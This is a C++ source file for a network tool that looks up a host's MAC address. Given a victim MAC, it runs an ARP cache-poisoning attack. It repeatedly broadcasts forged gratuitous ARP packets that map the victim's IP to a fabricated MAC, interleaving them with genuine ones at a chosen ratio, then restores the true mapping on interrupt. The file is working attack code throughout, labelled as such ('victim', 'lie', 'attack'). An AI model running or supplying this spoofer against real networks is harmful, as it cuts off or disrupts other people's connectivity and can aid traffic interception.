#include "traffic/transport.h"
#include "toolkit/logging.h"
#include "toolkit/args.h"
#include "toolkit/toolkit.h"
#include <signal.h>
#include <atomic>
#include <thread>

std::atomic<bool> end_attack = false;

void onInterrupt(int)
{
    ILOG("about to stop attack...");
    end_attack = true;
}

net::Mac forgeMacAddr(net::Mac const& origin)
{
    net::Mac forged = origin;
    forged.b1 += 6;
    forged.b2 += 5;
    forged.b3 += 4;
    forged.b4 += 3;
    forged.b5 += 2;
    forged.b6 += 1;
    return forged;
}

int main(int argc, char* argv[])
{
    MY_TRY
    toolkit::runAsRoot(argc, argv);
    toolkit::Args args(argc, argv);
    args.positional("ip", po::value<std::string>()->default_value(""), "ipv4 address", 1);
    args.optional("attack,a", po::value<std::string>()->default_value(""), "arp attack mac");
    args.optional("per,p", po::value<int>()->default_value(500), "send period (ms)");
    args.optional("ratio,r", po::value<float>()->default_value(100), "attack ratio (%)");
    CHECK_ERR_RTI(args.parse());

    auto opt_ip = args.get<std::string>("ip");
    auto opt_attack_mac = args.get<std::string>("attack");
    auto opt_per = args.get<int>("per");
    auto opt_ratio = args.get<float>("ratio");

    if (opt_ip.empty() && opt_attack_mac.empty()) {
        ELOG("empty ipv4 address, please input ip");
        return -1;
    }

    net::Ip4 ip = !opt_ip.empty() ? net::Ip4(opt_ip) : net::Ip4::kZeros;
    auto& apt = net::Adaptor::fit(ip);
    void* handle;
    CHECK_ERR_RTI(net::Transport::open(apt, handle));
    auto handle_guard = toolkit::scopeExit([&] { net::Transport::close(handle); });

    if (opt_attack_mac.empty()) {
        net::Mac mac;
        if (net::Transport::ip2mac(handle, ip, mac) == MyErrCode::kOk) {
            ILOG("{} is at {}", ip, mac);
        } else {
            ILOG("{} is offline", ip);
        }
    } else {
        signal(SIGINT, onInterrupt);
        int lie_per = opt_per * (opt_ratio / 100.0);
        int true_per = opt_per - lie_per;
        int rarp_cycle = 60'000 / opt_per;
        int rarp_cnt = 0;
        net::Packet truth;
        net::Packet lie;
        net::Ip4 victim_ip;
        net::Mac victim_actual_mac(opt_attack_mac, true);
        net::Mac victim_forged_mac = forgeMacAddr(victim_actual_mac);
        ILOG("forging victim {} to be {}", victim_actual_mac, victim_forged_mac);
        ILOG("send period is {}ms, attack ratio {:.3f}%", opt_per, opt_ratio);
        while (!end_attack) {
            if (rarp_cnt == 0) {
                net::Ip4 victim_new_ip;
                if (net::Transport::mac2ip(victim_actual_mac, victim_new_ip) == MyErrCode::kOk) {
                    if (victim_new_ip != victim_ip) {
                        victim_ip = victim_new_ip;
                        ILOG("victim {} is at {}", victim_actual_mac, victim_ip);
                        lie = net::Packet::arp(victim_forged_mac, victim_ip, victim_forged_mac,
                                               victim_ip, true);
                        truth = net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac,
                                                 victim_ip, true);
                    } else {
                        DLOG("victim {} is still at {}", victim_actual_mac, victim_ip);
                    }
                }
            }
            // TLOG("forge victim {} at {}", victim_forged_mac, victim_ip);
            rarp_cnt = (rarp_cnt + 1) % rarp_cycle;
            if (lie_per > 0) {
                CHECK_ERR_RTI(net::Transport::send(handle, lie));
                std::this_thread::sleep_for(std::chrono::milliseconds(lie_per));
            }
            if (true_per > 0) {
                CHECK_ERR_RTI(net::Transport::send(handle, truth));
                std::this_thread::sleep_for(std::chrono::milliseconds(true_per));
            }
        }
        ILOG("attack stopped");
        if (net::Transport::mac2ip(victim_actual_mac, victim_ip) == MyErrCode::kOk) {
            truth =
                net::Packet::arp(victim_actual_mac, victim_ip, victim_actual_mac, victim_ip, true);
            for (int i = 0; i < 5; ++i) {
                CHECK_ERR_RTI(net::Transport::send(handle, truth));
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            ILOG("victim {} restored at {}", victim_actual_mac, victim_ip);
        }
    }
    MY_CATCH_RTI
}
